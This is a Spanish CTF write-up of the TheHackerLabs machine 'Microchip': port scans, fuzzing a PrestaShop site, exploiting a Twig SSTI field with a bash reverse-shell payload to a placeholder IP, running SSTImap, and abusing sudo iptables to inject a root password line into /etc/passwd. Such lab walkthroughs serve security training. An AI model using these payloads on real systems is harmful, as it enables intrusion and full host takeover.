---
title: "Microchip - TheHackerLabs"
date: 2026-02-09
draft: false
slug: "THL-writeup-microchip"
excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, nos dirigimos a la página web activa en el puerto 80, siendo que después de analizarla y de aplicarle Fuzzing, descubrimos que utiliza Twig, lo que nos da un indicio de que puede ser vulnerable a Server Side Template Injection (SSTI). Encontramos un campo vulnerable a SSTI y logramos aplicar una Reverse Shell que nos da acceso a la máquina víctima, pero descubrimos que entramos a un contenedor de Docker. Dentro del contenedor, vemos que nuestro usuario puede usar el comando iptables e iptables-save como Root, lo que nos permite escalar privilegios y ser Root en el contenedor. Ahí mismo, leemos el Hash de la contraseña de un usuario registrado en el contenedor, que después crackeamos con JohnTheRipper. Probamos las credenciales en el servicio SSH, obteniendo acceso a la máquina víctima y con esas mismas credenciales, tenemos acceso al portal de Portainer. En dicho portal, creamos una montura de la raíz principal de la máquina víctima, permitiéndonos modificar el archivo /etc/passwd para cambiar la contraseña del Root y así escalar privilegios desde una sesión en el servicio SSH."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "Docker", "Portainer.io", "CMS PrestaShop", "Web Enumeration", "Fuzzing", "Server Side Template Injection (SSTI)", "Twig - SSTI (PHP)", "Automating SSTI (SSTImap)", "Abusing Sudoers Privilege On iptables and iptables-save Binaries", "Unauthorized Root Password Modification Via /etc/passwd", "Privesc - Abusing Sudoers Privilege On iptables and iptables-save Binaries", "Privesc - Unauthorized Root Password Modification Via /etc/passwd", "Cracking Hash", "Cracking SHA-512 Hash", "Password Reuse", "Abusing Portainer Portal to Mounting The Host Root Filesystem", "Privesc - Abusing Portainer Portal to Mounting The Host Root Filesystem", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "nc"
  - "git"
  - "python3"
  - "source"
  - "pip"
  - "sstimap.py"
  - "cat"
  - "grep"
  - "sudo"
  - "GTFOBins"
  - "openssl"
  - "iptables"
  - "iptables-save"
  - "su"
  - "JohnTheRipper"
  - "nxc"
  - "ssh"
  - "sed"
links:
  - "https://medium.com/@bootstrapsecurity/server-side-template-injection-ssti-advanced-exploitation-techniques-2d8ccdf6270f"
  - "https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md"
  - "https://github.com/vladko312/SSTImap"
  - "https://gtfobins.org/gtfobins/iptables-save/"
  - "https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/"
  - "https://rioasmara.com/2021/08/15/use-portainer-for-privilege-escalation/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-microchip/microchip.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.190
PING 192.168.100.190 (192.168.100.190) 56(84) bytes of data.
64 bytes from 192.168.100.190: icmp_seq=1 ttl=64 time=1.30 ms
64 bytes from 192.168.100.190: icmp_seq=2 ttl=64 time=1.01 ms
64 bytes from 192.168.100.190: icmp_seq=3 ttl=64 time=1.20 ms
64 bytes from 192.168.100.190: icmp_seq=4 ttl=64 time=0.971 ms

--- 192.168.100.190 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3941ms
rtt min/avg/max/mdev = 0.971/1.120/1.296/0.133 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.190 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 14:13 -0600
Initiating ARP Ping Scan at 14:13
Scanning 192.168.100.190 [1 port]
Completed ARP Ping Scan at 14:13, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:13
Scanning 192.168.100.190 [65535 ports]
Discovered open port 80/tcp on 192.168.100.190
Discovered open port 22/tcp on 192.168.100.190
Discovered open port 3306/tcp on 192.168.100.190
Discovered open port 33060/tcp on 192.168.100.190
Discovered open port 9000/tcp on 192.168.100.190
Completed SYN Stealth Scan at 14:13, 18.54s elapsed (65535 total ports)
Nmap scan report for 192.168.100.190
Host is up, received arp-response (0.00069s latency).
Scanned at 2026-02-07 14:13:06 CST for 18s
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 64
80/tcp    open  http       syn-ack ttl 63
3306/tcp  open  mysql      syn-ack ttl 64
9000/tcp  open  cslistener syn-ack ttl 63
33060/tcp open  mysqlx     syn-ack ttl 64
MAC Address: XX (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.83 seconds
           Raw packets sent: 87493 (3.850MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay varios puertos abiertos, pero me da curiosidad ver el **puerto 3306** abierto y desconozco los otros que aparecen.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,3306,9000,33060 192.168.100.190 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 14:13 -0600
Nmap scan report for 192.168.100.190
Host is up (0.0021s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)

| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp    open  http    Apache httpd 2.4.58 ((Ubuntu))

|_http-title: Did not follow redirect to http://microchip.thl
|_http-server-header: Apache/2.4.58 (Ubuntu)
3306/tcp  open  mysql   MySQL 8.0.42

| mysql-info: 
|   Protocol: 10
|   Version: 8.0.42
|   Thread ID: 11
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, ConnectWithDatabase, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsCompression, FoundRows, InteractiveClient, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, ODBCClient, LongColumnFlag, LongPassword, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: !ekFT\x18G\x171\x1EJ(W\x0Cv\x15\x12&&S
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.42_Auto_Generated_Server_Certificate
| Not valid before: 2025-04-23T17:42:38
|_Not valid after:  2035-04-21T17:42:38
9000/tcp  open  http    Gophish httpd

|_http-title: Portainer
33060/tcp open  mysqlx  MySQL X protocol listener
MAC Address: XX (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.36 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Gracias a este escaneo, obtenemos bastante información:
* Identificamos un dominio que se asocia a la página web activa en el **puerto 80**, siendo el dominio `microchip.thl`.
* Vemos el uso de lo que parece ser **Gophish o Portainer**, pero eso lo comprobaremos más adelante.
* Por último, vemos información sobre el **servicio MySQL** y vemos que en el **puerto 33060** se usa **MySQLx**.

Registremos el dominio en el `/etc/hosts`:
```bash
echo "192.168.100.190 microchip.thl" >> /etc/hosts
```
Vayamos a ver esa página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura1.png">
</p>

Parece ser una tienda de souvenirs.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura2.png">
</p>

Hay bastantes herramientas y, entre ellas, me llama la atención el uso de un **Ecommerce** llamado **PrestaShop**:

| **CMS PrestaShop** |
|:------------------:|
| *PrestaShop es un CMS de comercio electrónico (e-commerce), open-source, escrito principalmente en PHP y que usa MySQL/MariaDB como base de datos. Sirve para crear y gestionar tiendas online sin tener que programar todo desde cero.* |

Lo interesante es que navegando en la página, podemos ver el uso de muchos parámetros e incluso en algunas subpáginas.

También podemos registrarnos para crear una cuenta:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura3.png">
</p>

De momento no encontramos algo más, por lo que podemos aplicar **Fuzzing** e investigar vulnerabilidades sobre este CMS, pero veamos la página web del **puerto 9000**.

### Analizando Página Web del Puerto 9000 {#Puerto9k}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura4.png">
</p>

Es un login para entrar al portal de **Portainer.io**.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura5.png">
</p>

No hay mucho que destacar.

Investiguemos qué es **Portainer.io**:

| **Portainer.io** |
|:----------------:|
| *Portainer es una herramienta web para administrar contenedores Docker (y también Docker Swarm y Kubernetes) desde una interfaz gráfica. En vez de manejar todo por CLI (docker ps, docker run, etc.), Portainer te da un panel visual para ver, crear y controlar contenedores, imágenes, volúmenes y redes.* |

Así que este login es para administrar contenedores de **Docker**.

Como no tenemos credenciales de acceso, dejemos este login para más adelante.

Apliquemos **Fuzzing** a la página web del **puerto 80**.

### Fuzzing {#fuzz}

Primero utilicemos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt:FUZZ -u http://microchip.thl/FUZZ -t 300 -e .php,.txt,.html -mc 200,301,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://microchip.thl/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200,301,302
________________________________________________

templates               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 20ms]
modules                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 10ms]
themes                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 27ms]
bin                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 40ms]
cache                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 47ms]
docs                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 53ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 71ms]
download                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 71ms]
config                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 75ms]
img                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 72ms]
classes                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 69ms]
pdf                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 74ms]
tools                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 76ms]
mails                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 40ms]
translations            [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 46ms]
index.php               [Status: 200, Size: 96542, Words: 24717, Lines: 2411, Duration: 314ms]
src                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 16ms]
controllers             [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 6ms]
vendor                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 42ms]
robots.txt              [Status: 200, Size: 2412, Words: 143, Lines: 83, Duration: 30ms]
webservice              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 65ms]
app                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 5130ms]
upload                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 5139ms]
var                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 5235ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 9832ms]
localization            [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 40ms]
autoload.php            [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
INSTALL.txt             [Status: 200, Size: 5001, Words: 1516, Lines: 90, Duration: 76ms]
Makefile                [Status: 200, Size: 824, Words: 51, Lines: 41, Duration: 30ms]
override                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 93ms]
index.php               [Status: 200, Size: 96542, Words: 24717, Lines: 2411, Duration: 483ms]
robots.txt              [Status: 200, Size: 2412, Words: 143, Lines: 83, Duration: 35ms]
error500.html           [Status: 200, Size: 2506, Words: 1189, Lines: 97, Duration: 116ms]
.                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 319ms]
LICENSES                [Status: 200, Size: 183862, Words: 29187, Lines: 3257, Duration: 35ms]
:: Progress: [514492/514492] :: Job [1/1] :: 265 req/sec :: Duration: [0:03:57] :: Errors: 5 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*	     | Para especificar una extensión a buscar. |
| *-mc*	     | Para aplicar un flitro que solo muestra resultados con un código de estado especifico. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://microchip.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 300 -x php,txt,html -s 200,301 -b "" --ne
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://microchip.thl
[+] Method:         GET
[+] Threads:        300
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
[+] Status codes:   200,301
[+] User Agent:     gobuster/3.8.2
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
templates            (Status: 301) [Size: 318] [--> http://microchip.thl/templates/]
upload               (Status: 301) [Size: 315] [--> http://microchip.thl/upload/]
app                  (Status: 301) [Size: 312] [--> http://microchip.thl/app/]
pdf                  (Status: 301) [Size: 312] [--> http://microchip.thl/pdf/]
tools                (Status: 301) [Size: 314] [--> http://microchip.thl/tools/]
classes              (Status: 301) [Size: 316] [--> http://microchip.thl/classes/]
var                  (Status: 301) [Size: 312] [--> http://microchip.thl/var/]
javascript           (Status: 301) [Size: 319] [--> http://microchip.thl/javascript/]
index.php            (Status: 200) [Size: 96542]
mails                (Status: 301) [Size: 314] [--> http://microchip.thl/mails/]
translations         (Status: 301) [Size: 321] [--> http://microchip.thl/translations/]
js                   (Status: 301) [Size: 311] [--> http://microchip.thl/js/]
cache                (Status: 301) [Size: 314] [--> http://microchip.thl/cache/]
src                  (Status: 301) [Size: 312] [--> http://microchip.thl/src/]
controllers          (Status: 301) [Size: 320] [--> http://microchip.thl/controllers/]
modules              (Status: 301) [Size: 316] [--> http://microchip.thl/modules/]
docs                 (Status: 301) [Size: 313] [--> http://microchip.thl/docs/]
vendor               (Status: 301) [Size: 315] [--> http://microchip.thl/vendor/]
robots.txt           (Status: 200) [Size: 2412]
webservice           (Status: 301) [Size: 319] [--> http://microchip.thl/webservice/]
themes               (Status: 301) [Size: 315] [--> http://microchip.thl/themes/]
bin                  (Status: 301) [Size: 312] [--> http://microchip.thl/bin/]
localization         (Status: 301) [Size: 321] [--> http://microchip.thl/localization/]
autoload.php         (Status: 200) [Size: 0]
INSTALL.txt          (Status: 200) [Size: 5001]
Makefile             (Status: 200) [Size: 824]
override             (Status: 301) [Size: 317] [--> http://microchip.thl/override/]
robots.txt           (Status: 200) [Size: 2412]
index.php            (Status: 200) [Size: 96540]
error500.html        (Status: 200) [Size: 2506]
LICENSES             (Status: 200) [Size: 183862]
Progress: 514492 / 514492 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para especificar una extensión a buscar. |
| *-s*	     | Para aplicar un filtro que muestre solo los códigos de estado específicos. |
| *-b*	     | Para que funcione el filtro anterior. |
| *--ne*     | Para que no muestre errores. |

Encontramos bastantes resultados, pero solamente enfoquémonos en los siguientes.

Si vemos el archivo **INSTALL.txt**, veremos la versión que se está usando de **PrestaShop**:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura6.png">
</p>

También podemos ver el archivo **robots.txt**, en donde encontraremos los parámetros que ocupa la página:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura7.png">
</p>

Algo interesante que podemos encontrar es el directorio `/src` en donde podremos ver dónde se guarda toda la instalación del CMS:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura8.png">
</p>

Y si entramos al directorio **PrestaShopBundle**, veremos un directorio llamado **Twig**:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura9.png">
</p>

Investiguemos qué es **Twig**:

| **Twig** |
|:--------:|
| *Twig es un motor de plantillas para PHP. Su trabajo es generar HTML mezclando plantillas con datos, de forma segura y ordenada. Similar a Jinja2, solo que este último es enfocado en Python.* |

Al ver que es un motor de plantillas, puede que sea vulnerable a **Server Side Template Injection (SSTI)**, lo que nos permitiría ejecutar comandos dentro de la página.

La cuestión es saber dónde se puede probar, por lo que tendremos que buscar en toda la página web algún campo o parámetro vulnerable.

## Explotación de Vulnerabilidades {#Explotacion}

### Identificando Campo Vulnerable a Server Side Template Injection (SSTI) {#SSTI}

Revisando los campos donde podemos insertar texto en la página web, encontramos el siguiente que parece reproducir lo que escribimos:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura10.png">
</p>

Es bastante extraño este campo, ya que no es una funcionalidad común que puedas poner a una página web.

Puede que aquí podamos ejecutar el **SSTI**, así que probemos lo siguiente:

{% raw %}
```bash
{{7*7}}
```
{% endraw %}

Probemos:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura11.png">
</p>

Funciona, hemos encontrado un **SSTI**.

Podemos seguir jugando con este campo, utilizando los payloads del siguiente repositorio:
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md#twig" target="_blank">Repositorio de swisskyrepo: Server Side Template Injection - PHP (Twig)</a>

Pero curiosamente, casi todos los payloads no parecen funcionar, a excepción de las siguientes:

{% raw %}
```bash
{{7*7}}
{{dump(app)}}
{{dump(_context)}}
```
{% endraw %}

Aunque si utilizamos el siguiente payload, funcionará y veremos que se ejecuta el comando:

{% raw %}
```bash
{{system('id')}}
```
{% endraw %}

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura12.png">
</p>

Entonces, vamos a enviarnos una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Utiliza el siguiente payload:

{% raw %}
```bash
{{system("bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'")}}
```
{% endraw %}

Pruébala:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura13.png">
</p>

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.190] 33364
bash: cannot set terminal process group (27): Inappropriate ioctl for device
bash: no job control in this shell
www-data@62ca60255545:/var/www/prestashop$ whoami
whoami
www-data
```
Estamos dentro.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Continuemos.

### Utilizando Herramienta SSTImap para Identificar y Explotar Server Side Template Inyection (SSTI) {#SSTIauto}

Existe una herramienta llamada **SSTImap** que sirve para identificar y explotar **SSTI**.

Aquí la puedes encontrar:
* <a href="https://github.com/vladko312/SSTImap/tree/master" target="_blank">Repositorio de vladko312: SSTImap</a>

Para utilizarla, deberás clonar el repositorio e instalar los requerimientos de la herramienta.

Puedes hacerlo de la siguiente forma:
```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Con lo anterior hecho, ejecutamos **SSTImap**:
```bash
python3 sstimap.py

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |

                                                |_|
[*] Version: 1.3.2
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 6; generic: 5; php: 3; ruby: 2; python: 4; java: 4; javascript: 6
[*] Loaded request body types: 6

[-] SSTImap requires target URL (-u, --url), URLs/forms file (--load-urls / --load-forms) or interactive mode (-i, --interactive)
```
Funciona correctamente.

Para el uso de esta herramienta, debemos identificar un parámetro que pueda probar.

Digamos que no hemos identificado un parámetro vulnerable y queremos probar varios; entonces debemos generar una lista como la siguiente:
```bash
cat requests.txt
http://microchip.thl/index.php?order=test
http://microchip.thl/index.php?tag=test
http://microchip.thl/index.php?id_currency=test
http://microchip.thl/index.php?search_query=test
http://microchip.thl/index.php?back=test
http://microchip.thl/index.php?n=test
http://microchip.thl/index.php?controller=test
http://microchip.thl/index.php?fc=test
http://microchip.thl/index.php?user_input=test
```
Todos estos parámetros los encuentras dentro de la página.

Utilizamos la herramienta y le indicamos que pruebe todas las URLs que guardamos:
```bash
python3 sstimap.py --load-urls requests.txt

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |

                                                |_|
[*] Version: 1.3.2
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 6; generic: 5; php: 3; ruby: 2; python: 4; java: 4; javascript: 6
[*] Loaded request body types: 6
...
[+] Php_generic plugin has confirmed injection with tag '{*}' 
[+] SSTImap identified the following injection point:

  Query parameter: user_input
  Engine: Php_generic
  Injection: {*}
  Context: text
  OS: Linux
  Technique: rendered
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code

[+] Rerun SSTImap providing one of the following options:
    --interactive                Run SSTImap in interactive mode to switch between exploitation modes without losing progress.
    --os-shell                   Prompt for an interactive operating system shell.
    --os-cmd                     Execute an operating system command.
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.
    --bind-shell PORT            Connect to a shell bind to a target port.
    --reverse-shell HOST PORT    Send a shell back to the attacker's port.
    --upload LOCAL REMOTE        Upload files to the server.
    --download REMOTE LOCAL      Download remote files.
```
Excelente, identifico un parámetro vulnerable, siendo la URL `http://microchip.thl/index.php?user_input=test` y te da una lista de los comandos que puedes utilizar.

Obtengamos una shell interactiva:
```bash
python3 sstimap.py -u http://microchip.thl/index.php?user_input=test --os-shell

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |

                                                |_|
[*] Version: 1.3.2
[*] Author: @vladko312
[*] Based on Tplmap
...
[+] Run commands on the operating system.
Linux $ whoami
www-data
```
Estamos dentro.

Puedes seguir con esta sesión o con la primera que obtuvimos; yo seguiré con la primera.

## Post Explotación {#Post}

### Abusando de Permisos Sudoers Sobre Binarios iptables e iptables-save para Escalar Privilegios en Contenedor de Docker {#PrivescDocker}

Observa el **prompt**, siendo un indicativo de que estamos dentro de un **contenedor de Docker**.

Veamos qué usuarios existen dentro del contenedor:
```bash
www-data@62ca60255545:/var/www/prestashop$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
kike:x:1001:1001:,,,:/home/kike:/bin/bash
```
Tenemos dos usuarios, pero el de interés es el **usuario kike**.

Veamos si podemos entrar a su directorio:
```bash
kike:x:1001:1001:,,,:/home/kike:/bin/bash
www-data@62ca60255545:/var/www/prestashop$ ls -la /home
total 16
drwxr-xr-x 1 root   root   4096 Apr 25  2025 .
drwxr-xr-x 1 root   root   4096 Apr 25  2025 ..
drwxr-x--- 2 kike   kike   4096 Apr 25  2025 kike
drwxr-x--- 2 ubuntu ubuntu 4096 Apr  4  2025 ubuntu
```
No podemos.

Veamos si de casualidad nuestro usuario tiene algún privilegio:
```bash
www-data@62ca60255545:/var/www/prestashop$ sudo -l
Matching Defaults entries for www-data on 62ca60255545:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on 62ca60255545:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save
```
Muy bien, tenemos dos binarios que podemos usar como **Root**.

Investigando un poco, encontramos una forma de usar estos binarios para modificar archivos que solo el **Root** puede hacer, esto con la **guía de GTFOBins**:
* <a href="https://gtfobins.org/gtfobins/iptables-save/" target="_blank">GTFOBins: iptables-save</a>

Además, el siguiente blog explica cómo podemos abusar de estos binarios para sobreescribir la contraseña del **Root** en el archivo `/etc/passwd`:
* <a href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/" target="_blank">A Journey From sudo iptables To Local Privilege Escalation</a>

Puedes hacer todas las pruebas que menciona el blog, esto para asegurarte de que funciona esta escalada de privilegios.

En mi caso, probaré la escalada directamente.

Primero, creamos la contraseña con la herramienta **openssl**:
```bash
www-data@62ca60255545:/var/www/prestashop$ openssl passwd jakiado123
$1$IkT0H6Vg$BsJKEZfHdvf9Wl/wA0y4v0
```

Usaremos la misma entrada del usuario **Root** en el `/etc/passwd`, y ahí reemplazamos la **x** con el hash que obtuvimos del comando anterior, todo esto dentro del comando de iptables para sobreescribir archivos:
```bash
www-data@62ca60255545:/var/www/prestashop$ sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nroot:$1$IkT0H6Vg$BsJKEZfHdvf9Wl/wA0y4v0:0:0:root:/root:/bin/bash\n'
```
Esto añade la contraseña que creamos como una regla para poder inyectarla en un archivo que queramos.

Revisamos que la regla se haya creado correctamente:
```bash
www-data@62ca60255545:/var/www/prestashop$ sudo iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -i lo -m comment --comment DATA -j ACCEPT
-A INPUT -i lo -m comment --comment "
root:$1$IkT0H6Vg$BsJKEZfHdvf9Wl/wA0y4v0:0:0:root:/root:/bin/bash
" -j ACCEPT
```

